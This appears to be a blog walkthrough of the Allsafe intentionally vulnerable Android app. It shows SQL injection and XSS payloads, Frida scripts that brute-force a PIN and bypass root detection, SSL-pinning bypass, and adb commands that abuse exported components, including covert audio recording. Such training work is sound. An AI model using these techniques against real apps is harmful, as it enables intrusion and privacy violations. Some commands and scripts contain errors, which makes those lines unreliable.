---
layout: single
title:  "Allsafe Android Walkthrough - Part 1"
classes: wide
categories: Android
toc: true
---
## Introduction
[Allsafe](https://github.com/t0thkr1s/allsafe){:target="_blank"} is just another intentionally vulnerable Android application. The app is built with kotlin and contains many vulnerabilities with a nice difficulty curve. The main reason I'm writing a blog about this one is that it contains some nice Android challenges and there are no public writeups for the app till now.

## Prerequisites
Before starting, I'm assuming that the reader to have:
* Basic understanding of different components that Android apps use.  
* Rooted Android device/Emulator with frida installed.
* Android studio installed.

## 1. Insecure Logging
Developers normally use `logging` to trace their code, and troubleshoot errors but, sometimes developers write sensitive data in the logs such as login credentials or authentication tokens.   
To start testing for `Insecure Logging` in the app you first need to make sure that you are connected to the device via `adb` then use [logcat](https://developer.android.com/studio/command-line/logcat){:target="_blank"} to monitor the device logs. 

The challenge is straightforward and we don't need to dig deep into the code. After you open the challenge and before typing anything in the textview you first need to use `logcat` to monitor the logs. Doing that is as easy as `adb logcat` but, if you do it this way you'll receive a massive amount of logs from every service and application running on your device. Instead, you want to limit the logs you see to `Allsafe` only. To do that you can use the `--pid` to monitor logs generated from the Process id of your target only
```bash
 adb shell --pid=$(adb shell pidof -s infosecadventures.allsafe)
 ```
 Once you've done that you can type any string in the textview and once you press `Done` you'll notice that the **supposedly** secret/sensitive data is logged by the application.

 ![1](/assets/images/Android/Allsafe/1.jpg){: width="500" height="600"}

 ![2](/assets/images/Android/Allsafe/2.png)

## 2. Hardcoded Credentials
The task here is to find 2 sets of hardcoded usernames and passwords in the source code of the challenge.

![3](/assets/images/Android/Allsafe/3.jpg){: width="500" height="600"}

The Challenge's code is located in `infosecadventures.allsafe.challenges.HardcodedCredentials` class. The first set of creds can be found so easily defined in the string constant `BODY`.

 ![4](/assets/images/Android/Allsafe/4.png)

 If you scroll down a bit and inside the `onClick` method, you'll notice another string that is being used as a part of a request that is being constructed. 

 ![5](/assets/images/Android/Allsafe/5.png)

 To find that `dev_env` string navigate to `/Resources/resources.arsc/res/values/strings.xml` and search for it

 ![6](/assets/images/Android/Allsafe/6.png)

## 3. Firebase Database
![7](/assets/images/Android/Allsafe/7.jpg){: width="500" height="600"}

Firebase is a Realtime cloud-based NoSQL database that can be integrated with both Android and iOS apps. To start our testing we first need to find the firebase URL. In jadx navigate to `/Resources/resources.arsc/res/values/strings.xml` and search for `firebase` to locate it
 
  ![8](/assets/images/Android/Allsafe/8.png)

Next, from your browser try to access the `/.json` endpoint. If you get a `Permission Denied` response that means that the database is properly configured but if get a json data or even `null` as a response that means you at least have read permission. 

![9](/assets/images/Android/Allsafe/9.png)
## 4. Insecure Shared Preferences
![10](/assets/images/Android/Allsafe/10.jpg){: width="300" height="400"}

Data stored in a `SharedPreferences` object is written to an XML file within the application's data directory. If you look at the code of this challenge you'll see that `getSharedPreferences("user", 0)` creates a shared preference object with the default creation mode `MODE_PRIVATE` and is named `user.xml`. After that, the plaintext username and password of a registered user are stored in the xml file.

![11](/assets/images/Android/Allsafe/11.png)

This is a very bad practice because while on non-rooted devices, other apps normally can't read that xml file, it's not the same case on a rooted android device. You can confirm the existence of an `Insecure Data Storage` vulnerability by navigating to `/data/data/infosecadventures.allsafe/shared_prefs/` and reading `user.xml`

![12](/assets/images/Android/Allsafe/12.png)

## 5. SQL Injection
This one is just another basic and lame SQL Injection challenge. The challenge is to exploit a SQL Injection vulnerability in the login function which can be done using the good old `' or 1=1 -- ` payload and a dummy password.

![13](/assets/images/Android/Allsafe/13.jpg){: width="450" height="550"}

If you want to investigate it more, you'll notice that the username and password are both parts of a raw SQL query that lacks proper sanitization

![14](/assets/images/Android/Allsafe/14.png)

## 6. PIN Bypass
In this challenge, there is a hardcoded base64 encoded PIN in the app that we need to enter in the textview to solve the challenge. The goal of this challenge is to use frida to override the check function and force it to return `true` for any PIN but since the PIN is juat a 4-digit number, why not write a frida script to burteforce the correct PIN as well?

If you look at the source code, you'll see that the function responsible for validating the PIN is called `checkPin` and it returns true if the PIN we entered is the same as the hardcoded one. 

![15](/assets/images/Android/Allsafe/15.png)

The approach here is to write a simple for loop that calls the `checkPin` method with possible PIN values `(0000 - 9999)` as a string parameter, and once the correct PIN is passed to the function it'll return true signaling that we found the correct value.

```javascript
Java.perform(function(){

    var pinClass = Java.use("infosecadventures.allsafe.challenges.PinBypass");
    pinClass.checkPin.implementation = function(pin){
        for(var i = 0; i <= 9999; i++){
            var isValidPin = this.checkPin(String(i).padStart(4,0));
            if (isValidPin){
                console.log("[+] Valid PIN found: " + i);
                break;
            }
        }
        return true;
    }
});
```
Now, spawn the app using frida and give it the script to be injected as follows:
```bash
frida -U -l pinbypass.js -f infosecadventures.allsafe --no-pause
```
Finally, open the `PIN Bypass` challenge once more, enter a dummy pin to trigger the `checkPin` function and you'll find that the correct pin is logged in the frida REPL shell.

![16](/assets/images/Android/Allsafe/16.png)

## 7. Root Detection Bypass
Allsafe is using RootBear to check whether or not the app is running on a rooted device. While true it performs a lot of checks but they are all boolean function that can be hooked easily and forced to return false, but the checks are implemented in a naive way because all the checks are being called from a function named `isRooted` so we can just hook `isRooted` and force it to return false every time using the below frida script:

![17](/assets/images/Android/Allsafe/17.png)

```javascript
Java.perform(function(){

    var rootbeerClass = Java.use("com.scottyab.rootbeer.RootBeer");
    rootbeerClass.isRooted.implementation = function(){
        return true;
    }

});
```

Finally, use frida to inject the script into the app and you'll easily bypass the checks.

![18](/assets/images/Android/Allsafe/18.jpg){: width="300" height="420"}


## 7. Secure Flag Bypass
![19](/assets/images/Android/Allsafe/19.jpg){: width="450" height="550"}

This one and I quote: `Window flag: treat the content of the window as secure, preventing it from appearing in screenshots or from being viewed on non-secure displays.` You'll find it commonly used in banking applications. `FLAG_SECURE` is technically not a vulnerability and I'm not interested in going into details about it but, you can use [this frida script](https://gist.github.com/su-vikas/36410f67c9e0127961ae344010c4c0ef){:target="_blank"} to bypass it.

## 8. Deep Link Exploitation 
![20](/assets/images/Android/Allsafe/20.jpg){: width="450" height="550"}

In case you are not familiar with the term, [Deep links](https://developer.android.com/training/app-links/deep-linking){:target="_blank"} are basically hyperlinks that allow users to directly open specific views inside an android application.<br /> 
Before we start exploiting deep links we first need to understand how the application is processing the deep link data. I'll start by examining the `AndroidManifest.xml` file and search for `android:scheme` attributes inside `<data>` tags to find the deep link defined with below attributes:
* scheme: `allsafe`
* host: `infosecadventures`
* pathPrefix: `/congrats`

![21](/assets/images/Android/Allsafe/21.png)

You'll also notice that the code responsible for handling the deep link in `infosecadventures.allsafe.challenges.DeepLinkTask` 

![22](/assets/images/Android/Allsafe/22.png)

What's happening here is that the code first gets the data this intent is operating on, checks for a parameter named `key` and compares its value to something from `strings.xml` that's also named key. The goal is to make this `if` condition evaluates to `true` so before we start exploiting we need to get the key which is very obvious inside `strings.xml`

![23](/assets/images/Android/Allsafe/23.png)

Finally, use adb to send an intent with the proper `action` and `data` to trigger the code inside `DeepLinkTask` 

```bash 
adb shell am start -a "android.intent.action.VIEW" -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```
![24](/assets/images/Android/Allsafe/24.jpg){: width="300" height="450"}

## 9. Insecure Broadcast Receiver
![25](/assets/images/Android/Allsafe/25.jpg){: width="450" height="550"}

`BroadcastReceiver` is an android component that listens to system-wide broadcast events or intents. Examples of these broadcasts are when your phone's battery is running low then a broadcast indicating the low battery condition is sent. Some apps could be configured to listen for this broadcast and lower its power consumption and maybe lower the brightness on your screen, etc... 

Now the challenge speaks of a `Permission Re-delegation` issue that lets hackers capture notes sent via Allsafe's broadcast receiver.<br />
`Permission Re-delegation` and I quote, Permission re-delegation occurs when an application with permissions performs a privileged task for an application without permissions.

To start examining the broadcast receiver in the app, I'll go to `AndroidManifest.xml` and look for `<receiver>` tags.

![26](/assets/images/Android/Allsafe/26.png)

You'll notice 2 things:
1. It defines an `intent-filter` with `infosecadventures.allsafe.action.PROCESS_NOTE` as the action
2. The code responsible for handling a broadcast when received is in `infosecadventures.allsafe.challenges.NoteReceiver`

Now, whenever you want to analyze a broadcast receiver you want to start from the `onReceive` function and see how it handles broadcasts it receives. 

![27](/assets/images/Android/Allsafe/27.png)

From the code above, you'll see that it looks for 3 string extras named `server`, `note` and `notification_message`. The first 2 extras are passed to the `HttpUrl` object to build a certain url. Finally, `notification_message` is being used as the content of a push notification after the note is sent.<br />

Now, the `NoteReceiver` is exported, we can directly call it using adb and that gives us control over the values of `server`, `note` and `notification_message` so we can control what's being displayed in the push notification and we also control the server that notes will be sent to.

To call the receiver we'll use adb as follows
```bash
adb shell am broadcast -a "infosecadventures.allsafe.action.PROCESS_NOTE" --es server
 '192.168.1.10' --es note 'Hello,World' --es notification_message 'Compromised'
  -n infosecadventures.allsafe/.challenges.NoteReceiver
```
run that command and you'll notice the push notification with the content we specified indicating that we indeed control the values of the 3 string extras.

![28](/assets/images/Android/Allsafe/28.jpg){: width="450" height="550"}

## 10. Vulnerable WebView
![29](/assets/images/Android/Allsafe/29.jpg){: width="300" height="450"}

The challenge first requires showing an alert dialog and to access `/etc/hosts` from the filesystem. <br />
The second part looks simple enough as it hints that the `file` scheme is supported in this web view so I tried `file:///etc/hosts` and it worked.

![30](/assets/images/Android/Allsafe/30.jpg){: width="400" height="550"}

As for the first task, it was also simple. I just tried a couple of payloads until `<svg onload=alert(1337) >` worked

![31](/assets/images/Android/Allsafe/31.jpg){: width="400" height="550"}

## 11. Certificate Pinning
This is a basic SSL Pinning Bypass challenge. It is obvious from the code that it sends a HTTP request to `https://httpbin.org/json` and uses `OkHttpClient.Builder` for the pinning process which under the hood uses the `TrustManager` method to implement the SSL Pinning control. The application also uses a `NetworkSecurityConfig.xml` file which we can modify to make it trust user-installed certificates.

![32](/assets/images/Android/Allsafe/32.png)

There is no need to get into too much details on this one so, i'll just use [universal-android-ssl-pinning-bypass-with-frida](https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/){:target="_blank"} from codeshare to bypass ssl pinning the intercept the HTTPS traffic in Burp.

```bash
frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f infosecadventures.allsafe --no-pause
```
![33](/assets/images/Android/Allsafe/33.png)

## 12. Weak Cryptography
The goal of this challenge is to use frida to hook some encryption methods and obtain sensitive information like `Encryption key`, `IV` `Encryption Algorithm`, etc... <br />

![34](/assets/images/Android/Allsafe/34.jpg){: width="400" height="550"}

It is truly a good frida practice if you want to do it manually but to not make this blog longer than it already is, I'll just use [Intercept Android APK Crypto Operations](https://codeshare.frida.re/@fadeevab/intercept-android-apk-crypto-operations/) frida script from codeshare to monitor encryption operations. I'll spawn the app with the script, enter any text and press `ENCRYPT` and watch as the script logs all the info about the encryption process that just happened. It gives you information about the Algorithm, the Secret Key, and also the plaintext.

![35](/assets/images/Android/Allsafe/35.png)

You can also use [this script](https://github.com/Ch0pin/medusa/blob/master/modules/encryption/hash_operations.med){:target="_blank"} if you want to hook hashing operations as well.

## 13. Insecure Service
![36](/assets/images/Android/Allsafe/36.jpg){: width="400" height="550"}

In this challenge, the app has the `RECOED_AUDIO` permission. If you inspect the code you'll notice that once you click `START AUDIO RECORDER SERVICE` the app starts the service from `infosecadventures.allsafe.challenges.RecorderService`. 

![37](/assets/images/Android/Allsafe/37.png)

Inside `RecorderService` You'll see that it is configuring the android media recorder to record sounds for only a couple of seconds and then saves the recored in `mp3` format inside the `Download` directory in the `sdcard` (`/sdcard/Download`)

![38](/assets/images/Android/Allsafe/38.png)

Finally, from `AndroidManifest.xml` you'll find that `infosecadventures.allsafe.challenges.RecorderService` is exported so, we can directly call it to record audio without the need to open the application.

![39](/assets/images/Android/Allsafe/39.png)

To do that just use: 
```bash
adb shell am startservice infosecadventures.allsafe/.challenges.RecorderService
```

And you'll see that the phone indeed started recording voice and saved it to its expected location

![40](/assets/images/Android/Allsafe/40.jpg){: width="300" height="450"}
![41](/assets/images/Android/Allsafe/41.jpg){: width="300" height="450"}

## 14. Object Serialization
![42](/assets/images/Android/Allsafe/42.jpg){: width="400" height="550"}

For challenge No. 14, there seems to be an insecure data storage issue combined with insecure deserialization that must be exploited to give us privileges to use the `LOAD USER DATA` function.

Inside the code, there is a `User` object defined that takes a username, a password, and a default role of `ROLE_AUTHOR`. 

![45](/assets/images/Android/Allsafe/45.png)

Once you type a user and a password in the app and click `SAVE USER DATA` it uses `ObjectOutputStream.writeObject` to write a serialized `User` object to the App's External Files Directory which is `/sdcard/Android/data/<PackageName>/files`

![43](/assets/images/Android/Allsafe/43.png)

Finally, when you click `LOAD USER DATA` it deserializes the `User` object and checks if the role is set to `ROLE_EDITOR` or not. 

![44](/assets/images/Android/Allsafe/44.png)

The app doesn't check for anything else and doesn't check the integrity of the serialized object so we can just modify the stored serialized object and replace it with the original one.

Normally I'd use [SerialTweaker](https://github.com/redtimmy/SerialTweaker){:target="_blank"} from redtimmy but for this small object, I can just use a basic Hex editor to do the job.

![46](/assets/images/Android/Allsafe/46.png)

Next, I'll replace the new file with the old one and I'll be able to use the `LOAD USER DATA` function successfully this time.

![47](/assets/images/Android/Allsafe/47.jpg){: width="400" height="550"}